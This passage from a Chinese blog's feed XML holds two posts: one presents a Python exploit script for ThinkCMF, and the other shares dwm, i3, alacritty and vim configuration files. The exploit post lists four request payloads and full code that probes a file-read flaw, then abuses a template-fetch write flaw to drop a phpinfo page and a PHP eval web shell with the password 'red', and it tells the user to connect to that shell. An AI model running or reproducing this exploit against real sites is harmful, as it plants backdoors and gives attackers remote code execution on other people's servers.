      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Tools </tag>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个简单的thinkcmf-exp</title>
      <link href="2020/a-simple-thinkcmf-exp.html"/>
      <url>2020/a-simple-thinkcmf-exp.html</url>
      
        <content type="html"><![CDATA[<p>这是一个简单的<code>thinkcmf</code>的<code>exp</code>，实际上代码只用了<code>requests</code>库就完成了，但是为了使用体验还用了<code>argparse</code>库编写用户友好的命令行接口。下面来说说脚本探测的几个<code>payload</code>，以及用法。</p><a id="more"></a><p>探测以下4个payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;display&amp;templateFile&#x3D;README.md</span><br><span class="line">?a&#x3D;display&amp;templateFile&#x3D;config.yaml</span><br><span class="line">?a&#x3D;fetch&amp;templateFile&#x3D;public&#x2F;index&amp;prefix&#x3D;&#39;&#39;&amp;content&#x3D;&lt;php&gt;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();?&gt;&#39;)&lt;&#x2F;php&gt;</span><br><span class="line">?a&#x3D;fetch&amp;templateFile&#x3D;public&#x2F;index&amp;prefix&#x3D;&#39;&#39;&amp;content&#x3D;&lt;php&gt;file_put_contents(&#39;red.php&#39;,&#39;by:zjun &lt;?php eval($_POST[&quot;red&quot;]);?&gt;&#39;)&lt;&#x2F;php&gt;</span><br></pre></td></tr></table></figure><p>前两个主要判断是否存在网站文件读取漏洞,后两个是文件写入，分别测试写入<code>phpinfo</code>和<code>php一句话</code>。</p><p>代码使用<code>python3</code>实现，内容极其简单，代码勿喷。</p><p>目前只写了<code>单个url</code>的检测,没打算写批量,主要用法有<code>-u/--url</code>和<code>-h/--help</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author: zjun</span></span><br><span class="line"><span class="comment"># Github: https://github.com/z1un</span></span><br><span class="line"><span class="comment"># Date: 2020-02-10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> RequestException</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload_01</span>(<span class="params">url</span>):</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">response = requests.get((url+<span class="string">&#x27;?a=display&amp;templateFile=README.md&#x27;</span>), headers = headers, timeout = <span class="number">5</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;## README&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;[+]存在readme.md: &#123;&#125;?a=display&amp;templateFile=README.md&#x27;</span>.<span class="built_in">format</span>(url))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span> RequestException:</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload_02</span>(<span class="params">url</span>):</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">response = requests.get((url+<span class="string">&#x27;?a=display&amp;templateFile=config.yaml&#x27;</span>), headers = headers, timeout = <span class="number">5</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;name: thinkcmf&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">print(<span class="string">&#x27;[+]存在config.yaml: &#123;&#125;?a=display&amp;templateFile=config.yaml&#x27;</span>.<span class="built_in">format</span>(url))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span> RequestException:</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload_03</span>(<span class="params">url</span>):</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">response = requests.get((url+<span class="string">&quot;?a=fetch&amp;templateFile=public/index&amp;prefix=&#x27;&#x27;&amp;content=&lt;php&gt;file_put_contents(&#x27;test.php&#x27;,&#x27;&lt;?php phpinfo();?&gt;&#x27;)&lt;/php&gt;&quot;</span>), headers = headers, timeout = <span class="number">5</span>)</span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">response = requests.get((url+<span class="string">&#x27;/test.php&#x27;</span>), headers = headers, timeout = <span class="number">5</span>)</span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;http://www.php.net&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">print(<span class="string">&#x27;[+]phpinfo: &#123;&#125;/test.php&#x27;</span>.<span class="built_in">format</span>(url))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span> RequestException:</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload_04</span>(<span class="params">url</span>):</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">response = requests.get((url+<span class="string">&#x27;&#x27;&#x27;?a=fetch&amp;templateFile=public/index&amp;prefix=&#x27;&#x27;&amp;content=&lt;php&gt;file_put_contents(&#x27;red.php&#x27;,&#x27;by:zjun &lt;?php eval($_POST[&quot;red&quot;]);?&gt;&#x27;)&lt;/php&gt;&#x27;&#x27;&#x27;</span>), headers = headers,allow_redirects=<span class="literal">False</span>, timeout = <span class="number">5</span>)</span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">response = requests.get((url+<span class="string">&#x27;/red.php&#x27;</span>), headers = headers,allow_redirects=<span class="literal">False</span>, timeout = <span class="number">5</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;by:zjun&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">print(<span class="string">&#x27;[+]请连接shell,密码是red: &#123;&#125;/red.php&#x27;</span>.<span class="built_in">format</span>(url))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span> RequestException:</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">print(<span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> _   _     _       _                   __</span></span><br><span class="line"><span class="string">| |_| |__ (_)_ __ | | _____ _ __ ___  / _|       _____  ___ __</span></span><br><span class="line"><span class="string">| __| &#x27;_ \| | &#x27;_ \| |/ / __| &#x27;_ ` _ \| |_ _____ / _ \ \/ / &#x27;_ \</span></span><br><span class="line"><span class="string">| |_| | | | | | | |   &lt; (__| | | | | |  _|_____|  __/&gt;  &lt;| |_) |</span></span><br><span class="line"><span class="string"> \__|_| |_|_|_| |_|_|\_\___|_| |_| |_|_|        \___/_/\_\ .__/</span></span><br><span class="line"><span class="string">                                                         |_|</span></span><br><span class="line"><span class="string">                                         -by:zjun</span></span><br><span class="line"><span class="string">                                        www.zjun.info</span></span><br><span class="line"><span class="string">该脚本具有一定误差,请谨慎使用,仅供参考!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;The exp of thinkcmf&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>,required=<span class="literal">True</span>,<span class="built_in">help</span>=<span class="string">&#x27;target url&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">url = args.url</span><br><span class="line">payload_01 = payload_01(url)</span><br><span class="line">payload_02 = payload_02(url)</span><br><span class="line">payload_03 = payload_03(url)</span><br><span class="line">payload_04 = payload_04(url)</span><br><span class="line"><span class="keyword">if</span> payload_01 <span class="keyword">and</span> payload_02 <span class="keyword">and</span> payload_03 <span class="keyword">and</span> payload_04 == <span class="number">2</span>:</span><br><span class="line">print(<span class="string">&#x27;[-]连接超时:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(url))</span><br><span class="line"><span class="keyword">elif</span> payload_01 <span class="keyword">and</span> payload_02 <span class="keyword">and</span> payload_03 <span class="keyword">and</span> payload_04 == <span class="number">1</span>:</span><br><span class="line">print(<span class="string">&#x27;[-]初步测试暂不存在thinkcmf漏洞: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(url))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">&#x27;^ _ ^ enjoy it!&#x27;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://github.com/z1un/thinkcmf-exp">项目地址</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> ThinkCmf </tag>
            
            <tag> Web渗透 </tag>
            
            <tag> Exploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dwm和i3的一些配置</title>
      <link href="2020/some-configurations-of-dwm-and-i3.html"/>
      <url>2020/some-configurations-of-dwm-and-i3.html</url>
      
        <content type="html"><![CDATA[<p><code>i3</code>使用了快2个月，现换成了我更喜欢的<code>dwm</code>。<a href="https://github.com/z1un/.config">i3</a>和<a href="https://github.com/z1un/dwm">dwm</a>都放在<code>github</code>，包括常用依赖，及字体等。</p><p><img src="https://oss.zjun.info/zjun.info/i3-1.webp" alt="i3-1"></p><h2 id="0x01-dwm"><a href="#0x01-dwm" class="headerlink" title="0x01 dwm"></a>0x01 dwm</h2><p><img src="https://oss.zjun.info/zjun.info/i3-2.webp" alt="i3-2"></p><p><a href="https://dwm.suckless.org/">dwm</a>是使用c编写的一个超级轻量的窗口管理器，其源码不超过2000行。不同与传统窗口管理器的体验，但我更喜欢<code>dwm</code></p><p>我的<a href="https://github.com/z1un/scripts">脚本文件</a>。</p><p>我使用的补丁:</p><ul><li><a href="https://dwm.suckless.org/patches/alpha/">dwm-alpha-20180613-b69c870.diff</a></li><li><a href="https://dwm.suckless.org/patches/autostart/">dwm-autostart-20161205-bb3bd6f.diff</a></li><li><a href="https://dwm.suckless.org/patches/awesomebar/">dwm-awesomebar-20191003-80e2a76.diff</a></li><li><a href="https://dwm.suckless.org/patches/fullscreen/">dwm-fullscreen-6.2.diff</a></li><li><a href="https://github.com/theniceboy/dwm-hide-and-restore-win.diff">dwm-hide-and-restore.diff</a> (by theniceboy)</li><li><a href="https://dwm.suckless.org/patches/hide_vacant_tags/">dwm-hide_vacant_tags-6.2.diff</a></li><li><a href="https://dwm.suckless.org/patches/noborder/">dwm-noborder-6.2.diff</a></li><li><a href="https://dwm.suckless.org/patches/pertag/">dwm-pertag-20170513-ceac8c9.diff</a></li><li><a href="https://dwm.suckless.org/patches/viewontag/">dwm-r1522-viewontag.diff</a></li><li><a href="https://dwm.suckless.org/patches/rotatestack/">dwm-rotatestack-20161021-ab9571b.diff</a></li><li><a href="https://dwm.suckless.org/patches/vanitygaps/">dwm-vanitygaps-20190508-6.2.diff</a></li></ul><p>自用版本<a href="https://github.com/z1un/dwm">dwm仓库</a>,可直接make。</p><h2 id="0x02-i3"><a href="#0x02-i3" class="headerlink" title="0x02 i3"></a>0x02 i3</h2><p>增添部分软件启动快捷键</p><p>添加了一些自启动和定时启动脚本</p><h2 id="0x03-alacritty"><a href="#0x03-alacritty" class="headerlink" title="0x03 alacritty"></a>0x03 alacritty</h2><p>修改字体以及大小与配色</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">font:</span></span><br><span class="line">  <span class="attr">normal:</span></span><br><span class="line">    <span class="attr">family:</span> <span class="string">Source</span> <span class="string">Code</span> <span class="string">Pro</span></span><br><span class="line">  <span class="attr">bold:</span></span><br><span class="line">    <span class="attr">family:</span> <span class="string">Source</span> <span class="string">Code</span> <span class="string">Pro</span></span><br><span class="line">  <span class="attr">italic:</span></span><br><span class="line">    <span class="attr">family:</span> <span class="string">Source</span> <span class="string">Code</span> <span class="string">Pro</span></span><br><span class="line">  <span class="attr">size:</span> <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="attr">background_opacity:</span> <span class="number">0.9</span></span><br><span class="line"><span class="comment"># Colors (Snazzy)</span></span><br><span class="line"><span class="attr">colors:</span></span><br><span class="line">  <span class="comment"># Default colors</span></span><br><span class="line">  <span class="attr">primary:</span></span><br><span class="line">    <span class="attr">background:</span> <span class="string">&#x27;0x282a36&#x27;</span></span><br><span class="line">    <span class="attr">foreground:</span> <span class="string">&#x27;0xf8f8f2&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Normal colors</span></span><br><span class="line">  <span class="attr">normal:</span></span><br><span class="line">    <span class="attr">black:</span>   <span class="string">&#x27;0x44475a&#x27;</span></span><br><span class="line">    <span class="attr">red:</span>     <span class="string">&#x27;0xff5555&#x27;</span></span><br><span class="line">    <span class="attr">green:</span>   <span class="string">&#x27;0x50fa7b&#x27;</span></span><br><span class="line">    <span class="attr">yellow:</span>  <span class="string">&#x27;0xf1fa8c&#x27;</span></span><br><span class="line">    <span class="attr">blue:</span>    <span class="string">&#x27;0xbd93f9&#x27;</span></span><br><span class="line">    <span class="attr">magenta:</span> <span class="string">&#x27;0xff79c6&#x27;</span></span><br><span class="line">    <span class="attr">cyan:</span>    <span class="string">&#x27;0x8be9fd&#x27;</span></span><br><span class="line">    <span class="attr">white:</span>   <span class="string">&#x27;0xffffff&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Bright colors</span></span><br><span class="line">  <span class="attr">bright:</span></span><br><span class="line">    <span class="attr">black:</span>   <span class="string">&#x27;0x44475a&#x27;</span></span><br><span class="line">    <span class="attr">red:</span>     <span class="string">&#x27;0xff5555&#x27;</span></span><br><span class="line">    <span class="attr">green:</span>   <span class="string">&#x27;0x50fa7b&#x27;</span></span><br><span class="line">    <span class="attr">yellow:</span>  <span class="string">&#x27;0xf1fa8c&#x27;</span></span><br><span class="line">    <span class="attr">blue:</span>    <span class="string">&#x27;0xbd93f9&#x27;</span></span><br><span class="line">    <span class="attr">magenta:</span> <span class="string">&#x27;0xff79c6&#x27;</span></span><br><span class="line">    <span class="attr">cyan:</span>    <span class="string">&#x27;0x8be9fd&#x27;</span></span><br><span class="line">    <span class="attr">white:</span>   <span class="string">&#x27;0xffffff&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="0x04-polybar"><a href="#0x04-polybar" class="headerlink" title="0x04 polybar"></a>0x04 polybar</h2><p>添加屏幕亮度，音量大小管理，网络管理，CPU占用率与温度，电量，时间</p><h2 id="0x05-vim"><a href="#0x05-vim" class="headerlink" title="0x05 vim"></a>0x05 vim</h2><p>添加部分插件</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;       _</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">__</span>   <span class="string">_(_)_</span> <span class="string">__</span> <span class="string">___</span>  <span class="string">_</span> <span class="string">__</span> <span class="string">___</span></span><br><span class="line"><span class="string">&quot;\ \ / / | &#x27;_ ` _ \| &#x27;__/ __|</span></span><br><span class="line"><span class="string">&quot;</span> <span class="string">\</span> <span class="string">V</span> <span class="string">/|</span> <span class="string">|</span> <span class="string">|</span> <span class="string">|</span> <span class="string">|</span> <span class="string">|</span> <span class="string">|</span> <span class="string">|</span> <span class="string">|</span> <span class="string">(__</span></span><br><span class="line"><span class="string">&quot;  \_/ |_|_| |_| |_|_|  \___|</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;         --zjun--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">set nocompatible</span></span><br><span class="line"><span class="string">filetype on</span></span><br><span class="line"><span class="string">filetype indent on</span></span><br><span class="line"><span class="string">filetype plugin on</span></span><br><span class="line"><span class="string">filetype plugin indent on</span></span><br><span class="line"><span class="string">set mouse=a</span></span><br><span class="line"><span class="string">set encoding=utf-8</span></span><br><span class="line"><span class="string">let &amp;t_ut=&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">let mapleader=&quot;</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">syntax on</span></span><br><span class="line"><span class="string">set number</span></span><br><span class="line"><span class="string">set relativenumber</span></span><br><span class="line"><span class="string">set cursorline</span></span><br><span class="line"><span class="string">set wrap</span></span><br><span class="line"><span class="string">set showcmd</span></span><br><span class="line"><span class="string">set wildmenu</span></span><br><span class="line"><span class="string">set hlsearch</span></span><br><span class="line"><span class="string">exec &quot;</span><span class="string">nohlsearch&quot;</span></span><br><span class="line"><span class="string">set</span> <span class="string">incsearch</span></span><br><span class="line"><span class="string">set</span> <span class="string">ignorecase</span></span><br><span class="line"><span class="string">set</span> <span class="string">smartcase</span></span><br><span class="line"><span class="string">set</span> <span class="string">scrolloff=5</span></span><br><span class="line"></span><br><span class="line"><span class="string">noremap</span> <span class="string">xf</span> <span class="string">:set</span> <span class="string">splitbelow&lt;CR&gt;:split&lt;CR&gt;</span></span><br><span class="line"><span class="string">noremap</span> <span class="string">sf</span> <span class="string">:set</span> <span class="string">nosplitbelow&lt;CR&gt;:split&lt;CR&gt;</span></span><br><span class="line"><span class="string">noremap</span> <span class="string">yf</span> <span class="string">:set</span> <span class="string">splitright&lt;CR&gt;:vsplit&lt;CR&gt;</span></span><br><span class="line"><span class="string">noremap</span> <span class="string">zf</span> <span class="string">:set</span> <span class="string">nosplitbelow&lt;CR&gt;:vsplit&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="string">noremap</span> <span class="string">=</span> <span class="string">n</span></span><br><span class="line"><span class="string">noremap</span> <span class="bullet">-</span> <span class="string">N</span></span><br><span class="line"><span class="string">noremap</span> <span class="string">&lt;LEADER&gt;&lt;CR&gt;</span> <span class="string">:nohlsearch&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="string">map</span> <span class="string">s</span> <span class="string">&lt;nop&gt;</span></span><br><span class="line"><span class="string">map</span> <span class="string">S</span> <span class="string">:w&lt;CR&gt;</span></span><br><span class="line"><span class="string">map</span> <span class="string">Q</span> <span class="string">:q&lt;CR&gt;</span></span><br><span class="line"><span class="string">map</span> <span class="string">R</span> <span class="string">:source</span> <span class="string">$MYVIMRC&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="string">map</span> <span class="string">&lt;LEADER&gt;h</span> <span class="string">&lt;C-w&gt;h</span></span><br><span class="line"><span class="string">map</span> <span class="string">&lt;LEADER&gt;j</span> <span class="string">&lt;C-w&gt;j</span></span><br><span class="line"><span class="string">map</span> <span class="string">&lt;LEADER&gt;k</span> <span class="string">&lt;C-w&gt;k</span></span><br><span class="line"><span class="string">map</span> <span class="string">&lt;LEADER&gt;l</span> <span class="string">&lt;C-w&gt;l</span></span><br><span class="line"></span><br><span class="line"><span class="string">map</span> <span class="string">j</span> <span class="string">:res</span> <span class="string">+5&lt;CR&gt;</span></span><br><span class="line"><span class="string">map</span> <span class="string">k</span> <span class="string">:res</span> <span class="number">-5</span><span class="string">&lt;CR&gt;</span></span><br><span class="line"><span class="string">map</span> <span class="string">h</span> <span class="string">:vertical</span> <span class="string">resize-5&lt;CR&gt;</span></span><br><span class="line"><span class="string">map</span> <span class="string">l</span> <span class="string">:vertical</span> <span class="string">resize+5&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="string">map</span> <span class="string">t</span> <span class="string">:tabe&lt;CR&gt;</span></span><br><span class="line"><span class="string">map</span> <span class="string">th</span> <span class="string">:-tabnext&lt;CR&gt;</span></span><br><span class="line"><span class="string">map</span> <span class="string">tl</span> <span class="string">:+tabnext&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="string">call</span> <span class="string">plug#begin(&#x27;~/.vim/plugged&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="string">Plug</span> <span class="string">&#x27;vim-airline/vim-airline&#x27;</span></span><br><span class="line"><span class="string">Plug</span> <span class="string">&#x27;connorholyday/vim-snazzy&#x27;</span></span><br><span class="line"><span class="string">Plug</span> <span class="string">&#x27;ycm-core/YouCompleteMe&#x27;</span></span><br><span class="line"><span class="string">Plug</span> <span class="string">&#x27;dense-analysis/ale&#x27;</span></span><br><span class="line"><span class="string">Plug</span> <span class="string">&#x27;mbbill/undotree&#x27;</span></span><br><span class="line"><span class="string">Plug</span> <span class="string">&#x27;iamcco/markdown-preview.vim&#x27;</span></span><br><span class="line"><span class="string">call</span> <span class="string">plug#end()</span></span><br><span class="line"></span><br><span class="line"><span class="string">color</span> <span class="string">snazzy</span></span><br><span class="line"><span class="string">let</span> <span class="string">g:SnazzyTransparent</span> <span class="string">=</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; ===</span></span><br><span class="line"><span class="string">&quot;</span> <span class="string">===</span> <span class="string">ale</span></span><br><span class="line"><span class="string">&quot; ===</span></span><br><span class="line"><span class="string">let b:ale_linters = [&#x27;pylint&#x27;]</span></span><br><span class="line"><span class="string">let b:ale_fixers = [&#x27;autopep8&#x27;, &#x27;yapf&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> <span class="string">===</span></span><br><span class="line"><span class="string">&quot; === Undotree</span></span><br><span class="line"><span class="string">&quot;</span> <span class="string">===</span></span><br><span class="line"><span class="string">let</span> <span class="string">g:undotree_DiffAutoOpen</span> <span class="string">=</span> <span class="number">0</span></span><br><span class="line"><span class="string">map</span> <span class="string">L</span> <span class="string">:UndotreeToggle&lt;CR&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x06-ranger"><a href="#0x06-ranger" class="headerlink" title="0x06 ranger"></a>0x06 ranger</h2><p><code>ranger</code>是一款极好用的终端文件管理器，功能十分强大，一个普通文件管理器有的功能他都有。</p><p><img src="https://oss.zjun.info/zjun.info/i3-3.webp" alt="i3-3"></p><h2 id="0x07-i3lock"><a href="#0x07-i3lock" class="headerlink" title="0x07 i3lock"></a>0x07 i3lock</h2><p>对于锁屏采用了<a href="https://github.com/meskarune/i3lock-fancy">i3lock</a>，效果还不错，锁屏带有模糊的截图</p><p>在i3config下添加锁屏快捷键</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bindsym <span class="variable">$mod</span>+Shift+s <span class="built_in">exec</span> i3lock-fancy</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/i3-4.jpg" alt="i3-4"></p><p><code>archlinux</code>安装过程<a href="http://blog.zjun.info/2020/archlinux.html">http://blog.zjun.info/2020/archlinux.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Archlinux </tag>
            
            <tag> Dwm </tag>
            
            <tag> I3 </tag>
            
            <tag> 窗口管理器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ArchLinux安装过程</title>
      <link href="2020/archLinux-installation-process.html"/>
      <url>2020/archLinux-installation-process.html</url>
      
